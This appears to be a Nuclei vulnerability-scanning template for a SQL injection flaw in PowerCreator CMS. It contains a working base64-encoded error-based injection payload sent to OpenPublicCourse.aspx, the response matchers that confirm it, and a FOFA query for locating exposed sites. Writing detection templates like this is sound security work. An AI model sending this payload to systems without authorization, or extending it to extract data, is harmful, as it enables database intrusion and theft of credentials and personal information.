http:
    - matchers:
        - condition: and
          part: body
          type: word
          words:
            - 0xe10adc3949ba59abbe56e057f20f883e
            - 转换成数据类型 int 时失败
        - status:
            - 500
          type: status
      matchers-condition: and
      raw:
        - |
          GET /OpenPublicCourse.aspx?cid=NSBhbmQgMT1zeXMuZm5fc3FsdmFyYmFzZXRvc3RyKEhhc2hCeXRlcygnTUQ1JywnMTIzNDU2JykpLS0%3D HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
id: PowerCreator-CMS-OpenPublicCourse_aspx-sql
info:
    author: Superhero
    description: |-
        fofa: app="PowerCreator-CMS"
        PowerCreator CMS OpenPublicCourse.aspx 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: PowerCreator CMS OpenPublicCourse.aspx sql注入
    reference:
        - https://mp.weixin.qq.com/s/y3GKFKpSeqoVGR7qfosHEw
    severity: high
    tags:
        - PowerCreator
